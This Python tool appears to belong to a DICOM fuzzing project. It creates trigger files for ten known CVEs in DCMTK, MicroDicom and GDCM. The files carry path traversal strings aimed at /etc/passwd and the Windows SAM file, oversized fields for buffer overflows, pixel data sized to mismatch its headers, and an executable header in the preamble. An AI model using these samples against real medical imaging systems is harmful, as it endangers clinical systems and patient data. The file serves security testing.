#!/usr/bin/env python3
"""CVE Sample Generator for DICOM Vulnerabilities

Generates DICOM files that trigger specific known vulnerabilities
for security testing and research purposes.

This tool is for authorized security testing only.
"""

from __future__ import annotations

import struct
from dataclasses import dataclass, field
from pathlib import Path

try:
    from pydicom.dataset import Dataset, FileMetaDataset
    from pydicom.encaps import encapsulate
    from pydicom.uid import (
        ExplicitVRLittleEndian,
        JPEGLosslessSV1,
        generate_uid,
    )

    HAS_PYDICOM = True
except ImportError:
    HAS_PYDICOM = False


@dataclass
class CVEInfo:
    """Information about a CVE."""

    cve_id: str
    product: str
    vulnerability_type: str
    cvss: float | str
    year: int
    description: str
    affected_versions: str
    fixed_version: str
    references: list[str] = field(default_factory=list)


# CVE Registry
CVE_DATABASE: dict[str, CVEInfo] = {
    "CVE-2019-11687": CVEInfo(
        cve_id="CVE-2019-11687",
        product="DICOM Standard",
        vulnerability_type="Design flaw - preamble executable",
        cvss="N/A",
        year=2019,
        description="DICOM preamble can contain executable headers",
        affected_versions="All DICOM implementations",
        fixed_version="Mitigation: preamble validation",
        references=[
            "https://nvd.nist.gov/vuln/detail/CVE-2019-11687",
            "https://github.com/d00rt/pedicom",
        ],
    ),
    "CVE-2022-2119": CVEInfo(
        cve_id="CVE-2022-2119",
        product="DCMTK",
        vulnerability_type="Path traversal (SCP)",
        cvss=7.5,
        year=2022,
        description="Path traversal in C-STORE SCP allows arbitrary file write",
        affected_versions="< 3.6.7",
        fixed_version="3.6.7",
        references=[
            "https://nvd.nist.gov/vuln/detail/CVE-2022-2119",
            "https://claroty.com/team82/research/dicom-demystified",
        ],
    ),
    "CVE-2022-2120": CVEInfo(
        cve_id="CVE-2022-2120",
        product="DCMTK",
        vulnerability_type="Path traversal (SCU)",
        cvss=7.5,
        year=2022,
        description="Path traversal in C-GET SCU allows arbitrary file write",
        affected_versions="< 3.6.7",
        fixed_version="3.6.7",
        references=[
            "https://nvd.nist.gov/vuln/detail/CVE-2022-2120",
        ],
    ),
    "CVE-2022-2121": CVEInfo(
        cve_id="CVE-2022-2121",
        product="DCMTK",
        vulnerability_type="Null pointer dereference",
        cvss=6.5,
        year=2022,
        description="Null pointer dereference when reading from STDIN",
        affected_versions="< 3.6.7",
        fixed_version="3.6.7",
        references=[
            "https://nvd.nist.gov/vuln/detail/CVE-2022-2121",
        ],
    ),
    "CVE-2024-22100": CVEInfo(
        cve_id="CVE-2024-22100",
        product="MicroDicom DICOM Viewer",
        vulnerability_type="Heap-based buffer overflow",
        cvss=7.8,
        year=2024,
        description="Heap-based buffer overflow when parsing malformed DICOM files",
        affected_versions="< 2024.1",
        fixed_version="2024.1",
        references=[
            "https://nvd.nist.gov/vuln/detail/CVE-2024-22100",
            "https://www.cisa.gov/news-events/ics-medical-advisories/icsma-24-163-01",
        ],
    ),
    "CVE-2024-28877": CVEInfo(
        cve_id="CVE-2024-28877",
        product="MicroDicom DICOM Viewer",
        vulnerability_type="Stack-based buffer overflow",
        cvss=8.7,
        year=2024,
        description="Stack-based buffer overflow allowing arbitrary code execution",
        affected_versions="< 2024.2",
        fixed_version="2024.2",
        references=[
            "https://nvd.nist.gov/vuln/detail/CVE-2024-28877",
            "https://www.cisa.gov/news-events/ics-medical-advisories/icsma-24-163-01",
        ],
    ),
    "CVE-2024-33606": CVEInfo(
        cve_id="CVE-2024-33606",
        product="MicroDicom DICOM Viewer",
        vulnerability_type="Improper authorization in URL scheme handler",
        cvss=8.8,
        year=2024,
        description="Custom URL scheme allows retrieval of sensitive files and planting of images",
        affected_versions="< 2024.2",
        fixed_version="2024.2",
        references=[
            "https://nvd.nist.gov/vuln/detail/CVE-2024-33606",
            "https://www.cisa.gov/news-events/ics-medical-advisories/icsma-24-163-01",
        ],
    ),
    "CVE-2025-5943": CVEInfo(
        cve_id="CVE-2025-5943",
        product="MicroDicom DICOM Viewer",
        vulnerability_type="Out-of-bounds write",
        cvss=8.8,
        year=2025,
        description="OOB write when parsing malformed DICOM files",
        affected_versions="< 2025.3",
        fixed_version="2025.3",
        references=[
            "https://www.cisa.gov/news-events/ics-medical-advisories/icsma-25-160-01",
        ],
    ),
    "CVE-2025-11266": CVEInfo(
        cve_id="CVE-2025-11266",
        product="Grassroots DICOM (GDCM)",
        vulnerability_type="Out-of-bounds write (PixelData)",
        cvss=6.6,
        year=2025,
        description="OOB write in PixelData fragment parsing",
        affected_versions="< 3.2.2",
        fixed_version="3.2.2",
        references=[
            "https://www.cisa.gov/news-events/ics-medical-advisories/icsma-25-345-01",
        ],
    ),
    "CVE-2025-53618": CVEInfo(
        cve_id="CVE-2025-53618",
        product="Grassroots DICOM (GDCM)",
        vulnerability_type="Out-of-bounds read (JPEG codec)",
        cvss=7.5,
        year=2025,
        description="OOB read in JPEGBITSCodec",
        affected_versions="< 3.0.24",
        fixed_version="3.0.24",
        references=[
            "https://www.redpacketsecurity.com/cve-alert-cve-2025-53618",
        ],
    ),
}


class CVESampleGenerator:
    """Generator for CVE-specific DICOM samples."""

    def __init__(self, output_dir: str | Path = ".") -> None:
        """Initialize the generator."""
        if not HAS_PYDICOM:
            raise ImportError("pydicom is required")
        self.output_dir = Path(output_dir)

    def create_base_dicom(self) -> Dataset:
        """Create a minimal valid DICOM dataset."""
        file_meta = FileMetaDataset()
        file_meta.MediaStorageSOPClassUID = "1.2.840.10008.5.1.4.1.1.2"  # type: ignore[assignment]
        file_meta.MediaStorageSOPInstanceUID = generate_uid()
        file_meta.TransferSyntaxUID = ExplicitVRLittleEndian

        ds = Dataset()
        ds.file_meta = file_meta
        ds.SOPClassUID = file_meta.MediaStorageSOPClassUID
        ds.SOPInstanceUID = file_meta.MediaStorageSOPInstanceUID
        ds.PatientName = "CVE^TEST"
        ds.PatientID = "CVE-TEST-001"
        ds.StudyDate = "20250101"
        ds.StudyTime = "120000"
        ds.Modality = "OT"
        ds.SeriesInstanceUID = generate_uid()
        ds.StudyInstanceUID = generate_uid()
        ds.FrameOfReferenceUID = generate_uid()
        ds.InstanceNumber = 1
        ds.ImageType = ["DERIVED", "SECONDARY"]
        ds.Rows = 8
        ds.Columns = 8
        ds.BitsAllocated = 8
        ds.BitsStored = 8
        ds.HighBit = 7
        ds.PixelRepresentation = 0
        ds.SamplesPerPixel = 1
        ds.PhotometricInterpretation = "MONOCHROME2"
        ds.PixelData = bytes([128] * 64)

        return ds

    def generate_cve_2019_11687(self, output_path: Path | None = None) -> Path:
        """Generate sample for CVE-2019-11687 (Preamble executable).

        Creates a DICOM file with PE header in preamble.
        """
        if output_path is None:
            output_path = self.output_dir / "cve_2019_11687" / "trigger.dcm"

        output_path.parent.mkdir(parents=True, exist_ok=True)

        # This is covered by preamble_attacks/generator.py
        # Create a simple demonstration
        ds = self.create_base_dicom()
        ds.PatientName = "CVE-2019-11687^PREAMBLE_EXEC"

        # Create PE header for preamble
        preamble = bytearray(128)
        preamble[0:2] = b"MZ"  # DOS magic
        struct.pack_into("<I", preamble, 60, 0x80)  # e_lfanew

        ds.save_as(output_path, write_like_original=False)

        # Inject preamble
        with open(output_path, "r+b") as f:
            content = f.read()
            f.seek(0)
            f.write(bytes(preamble))
            f.write(content[128:])

        return output_path

    def generate_cve_2022_2119(self, output_path: Path | None = None) -> Path:
        """Generate sample for CVE-2022-2119 (DCMTK path traversal SCP).

        Creates a DICOM file with path traversal in metadata.
        """
        if output_path is None:
            output_path = self.output_dir / "cve_2022_2119" / "trigger.dcm"

        output_path.parent.mkdir(parents=True, exist_ok=True)

        ds = self.create_base_dicom()
        ds.PatientName = "CVE-2022-2119^PATH_TRAVERSAL"

        # Path traversal payload in various fields
        # These fields might be used to construct filenames
        ds.PatientID = "../../../tmp/pwned"
        ds.StudyID = "..\\..\\..\\windows\\temp\\pwned"

        # Add a private tag with traversal
        ds.add_new(0x00091001, "LO", "../../../etc/passwd")

        ds.save_as(output_path, write_like_original=False)
        return output_path

    def generate_cve_2022_2120(self, output_path: Path | None = None) -> Path:
        """Generate sample for CVE-2022-2120 (DCMTK path traversal SCU).

        Similar to CVE-2022-2119 but for client-side.
        """
        if output_path is None:
            output_path = self.output_dir / "cve_2022_2120" / "trigger.dcm"

        output_path.parent.mkdir(parents=True, exist_ok=True)

        ds = self.create_base_dicom()
        ds.PatientName = "CVE-2022-2120^PATH_TRAVERSAL_SCU"

        # The vulnerability is in filename handling during C-GET
        # Simulate malicious filename in metadata
        ds.SOPInstanceUID = "1.2.3.4.5/../../../tmp/exploit"

        ds.save_as(output_path, write_like_original=False)
        return output_path

    def generate_cve_2022_2121(self, output_path: Path | None = None) -> Path:
        """Generate sample for CVE-2022-2121 (DCMTK null pointer deref).

        Creates a truncated/malformed DICOM that triggers null deref.
        """
        if output_path is None:
            output_path = self.output_dir / "cve_2022_2121" / "trigger.dcm"

        output_path.parent.mkdir(parents=True, exist_ok=True)

        ds = self.create_base_dicom()
        ds.PatientName = "CVE-2022-2121^NULL_DEREF"

        # Save and then truncate
        ds.save_as(output_path, write_like_original=False)

        # Create a truncated version that may trigger null deref
        with open(output_path, "r+b") as f:
            content = f.read()
            # Truncate at a specific point to trigger the bug
            # Keep preamble + DICM + partial header
            truncated = content[:200]
            f.seek(0)
            f.write(truncated)
            f.truncate()

        return output_path

    def generate_cve_2024_22100(self, output_path: Path | None = None) -> Path:
        """Generate sample for CVE-2024-22100 (MicroDicom heap buffer overflow).

        Creates DICOM with malformed data triggering heap overflow.
        """
        if output_path is None:
            output_path = self.output_dir / "cve_2024_22100" / "trigger.dcm"

        output_path.parent.mkdir(parents=True, exist_ok=True)

        ds = self.create_base_dicom()
        ds.PatientName = "CVE-2024-22100^HEAP_OVERFLOW"

        # Heap overflow conditions - large allocations with size mismatches
        ds.Rows = 4096
        ds.Columns = 4096
        ds.BitsAllocated = 16
        ds.BitsStored = 12
        ds.HighBit = 11
        ds.SamplesPerPixel = 3
        ds.PhotometricInterpretation = "RGB"

        # Provide undersized pixel data to trigger overflow during copy
        # Expected: 4096 * 4096 * 3 * 2 bytes = 100,663,296 bytes
        # Actual: much smaller, causing potential heap corruption
        ds.PixelData = bytes([0xAA, 0xBB] * 2048)

        ds.save_as(output_path, write_like_original=False)
        return output_path

    def generate_cve_2024_28877(self, output_path: Path | None = None) -> Path:
        """Generate sample for CVE-2024-28877 (MicroDicom stack buffer overflow).

        Creates DICOM with oversized string fields triggering stack overflow.
        """
        if output_path is None:
            output_path = self.output_dir / "cve_2024_28877" / "trigger.dcm"

        output_path.parent.mkdir(parents=True, exist_ok=True)

        ds = self.create_base_dicom()
        ds.PatientName = "CVE-2024-28877^STACK_OVERFLOW"

        # Stack overflow via oversized string fields
        # Many DICOM viewers use fixed-size buffers for string fields
        overflow_string = "A" * 8192  # Oversized string

        ds.InstitutionName = overflow_string
        ds.ReferringPhysicianName = overflow_string
        ds.StudyDescription = overflow_string
        ds.SeriesDescription = overflow_string

        # Add private tags with large values
        ds.add_new(0x00091001, "LO", "B" * 4096)
        ds.add_new(0x00091002, "LT", "C" * 16384)

        ds.save_as(output_path, write_like_original=False)
        return output_path

    def generate_cve_2024_33606(self, output_path: Path | None = None) -> Path:
        """Generate sample for CVE-2024-33606 (MicroDicom URL scheme auth bypass).

        Creates DICOM with embedded URL scheme payloads.
        Note: This CVE is about the microdicom:// URL handler, not the file format.
        This sample contains metadata that could be used in URL scheme attacks.
        """
        if output_path is None:
            output_path = self.output_dir / "cve_2024_33606" / "trigger.dcm"

        output_path.parent.mkdir(parents=True, exist_ok=True)

        ds = self.create_base_dicom()
        ds.PatientName = "CVE-2024-33606^URL_SCHEME_BYPASS"

        # Payloads that could be used via microdicom:// URL scheme
        # The vulnerability allows reading/writing arbitrary files
        ds.PatientID = "microdicom://open?path=C:\\Windows\\System32\\config\\SAM"
        ds.StudyDescription = "file:///etc/passwd"
        ds.SeriesDescription = "..\\..\\..\\..\\Windows\\System32\\calc.exe"

        # RetrieveURL and related network fields
        ds.RetrieveURL = "file:///C:/sensitive/data.dcm"

        # Add Referenced File ID with traversal
        ds.add_new(0x00041500, "CS", "..\\..\\..\\secrets.txt")

        ds.save_as(output_path, write_like_original=False)
        return output_path

    def generate_cve_2025_5943(self, output_path: Path | None = None) -> Path:
        """Generate sample for CVE-2025-5943 (MicroDicom OOB write).

        Creates DICOM with malformed structure triggering OOB write.
        """
        if output_path is None:
            output_path = self.output_dir / "cve_2025_5943" / "trigger.dcm"

        output_path.parent.mkdir(parents=True, exist_ok=True)

        ds = self.create_base_dicom()
        ds.PatientName = "CVE-2025-5943^OOB_WRITE"

        # Create conditions that may trigger OOB write
        # Large/unusual dimensions
        ds.Rows = 65535
        ds.Columns = 65535
        ds.BitsAllocated = 16
        ds.BitsStored = 16
        ds.HighBit = 15

        # Mismatch between declared size and actual pixel data
        # Declare large image but provide small data
        ds.PixelData = bytes([0xFF] * 1024)  # Much smaller than declared

        ds.save_as(output_path, write_like_original=False)
        return output_path

    def generate_cve_2025_11266(self, output_path: Path | None = None) -> Path:
        """Generate sample for CVE-2025-11266 (GDCM PixelData OOB write).

        Creates DICOM with malformed encapsulated pixel data fragments.
        """
        if output_path is None:
            output_path = self.output_dir / "cve_2025_11266" / "trigger.dcm"

        output_path.parent.mkdir(parents=True, exist_ok=True)

        ds = self.create_base_dicom()
        ds.PatientName = "CVE-2025-11266^PIXELDATA_OOB"

        # Use JPEG transfer syntax for encapsulated data
        ds.file_meta.TransferSyntaxUID = JPEGLosslessSV1

        # Create malformed encapsulated pixel data
        # This simulates fragments that could trigger the underflow
        ds.Rows = 64
        ds.Columns = 64
        ds.BitsAllocated = 8
        ds.BitsStored = 8
        ds.HighBit = 7

        # Encapsulate with malformed fragments
        # Normal JPEG frame but with unusual fragment boundaries
        fake_jpeg = bytes(
            [
                0xFF,
                0xD8,  # SOI
                0xFF,
                0xE0,
                0x00,
                0x10,  # APP0
            ]
            + [0x00] * 14
            + [
                0xFF,
                0xD9,  # EOI
            ]
        )

        # Create encapsulated format manually
        # Fragment with size that could cause underflow
        ds.PixelData = encapsulate([fake_jpeg])

        ds.save_as(output_path, write_like_original=False)
        return output_path

    def generate_cve_2025_53618(self, output_path: Path | None = None) -> Path:
        """Generate sample for CVE-2025-53618 (GDCM JPEG codec OOB read).

        Creates DICOM with malformed JPEG-LS compressed data.
        """
        if output_path is None:
            output_path = self.output_dir / "cve_2025_53618" / "trigger.dcm"

        output_path.parent.mkdir(parents=True, exist_ok=True)

        ds = self.create_base_dicom()
        ds.PatientName = "CVE-2025-53618^JPEG_OOB_READ"

        # Use JPEG-LS transfer syntax
        ds.file_meta.TransferSyntaxUID = "1.2.840.10008.1.2.4.80"  # type: ignore[assignment]

        ds.Rows = 32
        ds.Columns = 32
        ds.BitsAllocated = 8
        ds.BitsStored = 8
        ds.HighBit = 7

        # Create malformed JPEG-LS data that could trigger OOB read
        # JPEG-LS marker structure with invalid lengths
        malformed_jpegls = bytes(
            [
                0xFF,
                0xD8,  # SOI
                0xFF,
                0xF7,  # SOF55 (JPEG-LS)
                0x00,
                0x0B,  # Length (too short)
                0x08,  # Precision
                0x00,
                0x20,  # Height
                0x00,
                0x20,  # Width
                0x01,  # Components
                0x01,
                0x11,
                0x00,  # Component spec
                0xFF,
                0xD9,  # EOI
            ]
        )

        ds.PixelData = encapsulate([malformed_jpegls])

        ds.save_as(output_path, write_like_original=False)
        return output_path

    def generate_all(self) -> dict[str, Path | None]:
        """Generate all CVE samples."""
        results: dict[str, Path | None] = {}

        generators = {
            "CVE-2019-11687": self.generate_cve_2019_11687,
            "CVE-2022-2119": self.generate_cve_2022_2119,
            "CVE-2022-2120": self.generate_cve_2022_2120,
            "CVE-2022-2121": self.generate_cve_2022_2121,
            "CVE-2024-22100": self.generate_cve_2024_22100,
            "CVE-2024-28877": self.generate_cve_2024_28877,
            "CVE-2024-33606": self.generate_cve_2024_33606,
            "CVE-2025-5943": self.generate_cve_2025_5943,
            "CVE-2025-11266": self.generate_cve_2025_11266,
            "CVE-2025-53618": self.generate_cve_2025_53618,
        }

        for cve_id, generator in generators.items():
            try:
                path = generator()
                results[cve_id] = path
                print(f"[+] Generated {cve_id}: {path}")
            except Exception as e:
                print(f"[-] Failed to generate {cve_id}: {e}")
                results[cve_id] = None

        return results


def generate_cve_readme(cve_id: str, output_dir: Path) -> None:
    """Generate README for a specific CVE."""
    if cve_id not in CVE_DATABASE:
        raise ValueError(f"Unknown CVE: {cve_id}")

    cve = CVE_DATABASE[cve_id]
    cve_dir = output_dir / cve_id.lower().replace("-", "_")
    cve_dir.mkdir(parents=True, exist_ok=True)

    readme_content = f"""# {cve.cve_id} - {cve.product}

## Overview

| Field | Value |
|-------|-------|
| CVE ID | {cve.cve_id} |
| Product | {cve.product} |
| Type | {cve.vulnerability_type} |
| CVSS | {cve.cvss} |
| Year | {cve.year} |
| Affected | {cve.affected_versions} |
| Fixed | {cve.fixed_version} |

## Description

{cve.description}

## Files

- `trigger.dcm` - DICOM file that triggers the vulnerability
- `README.md` - This file

## Testing

```bash
# Test with dicom-fuzzer
python -m dicom_fuzzer.cli.fuzz_viewer \\
    --input samples/cve_reproductions/{cve_id.lower().replace("-", "_")}/ \\
    --viewer "path/to/vulnerable/viewer"
```

## Mitigation

Update to version {cve.fixed_version} or later.

## References

"""
    for ref in cve.references:
        readme_content += f"- {ref}\n"

    readme_path = cve_dir / "README.md"
    readme_path.write_text(readme_content)
    print(f"[+] Generated README: {readme_path}")


def main() -> None:
    """CLI entry point."""
    import argparse

    parser = argparse.ArgumentParser(description="Generate CVE-specific DICOM samples")
    parser.add_argument(
        "--output-dir",
        default="samples/cve_reproductions",
        help="Output directory for samples",
    )
    parser.add_argument(
        "--cve",
        help="Generate specific CVE (e.g., CVE-2025-5943)",
    )
    parser.add_argument(
        "--list",
        action="store_true",
        help="List available CVEs",
    )
    parser.add_argument(
        "--readme",
        action="store_true",
        help="Generate README files for CVEs",
    )

    args = parser.parse_args()

    if args.list:
        print("Available CVEs:\n")
        for cve_id, info in CVE_DATABASE.items():
            print(f"  {cve_id}: {info.product} - {info.vulnerability_type}")
        return

    output_dir = Path(args.output_dir)
    generator = CVESampleGenerator(output_dir)

    if args.readme:
        for cve_id in CVE_DATABASE:
            generate_cve_readme(cve_id, output_dir)
        return

    if args.cve:
        cve_id = args.cve.upper()
        method_name = f"generate_{cve_id.lower().replace('-', '_')}"
        method = getattr(generator, method_name, None)
        if method:
            path = method()
            print(f"[+] Generated {cve_id}: {path}")
        else:
            print(f"[-] Unknown CVE: {cve_id}")
    else:
        generator.generate_all()


if __name__ == "__main__":
    main()
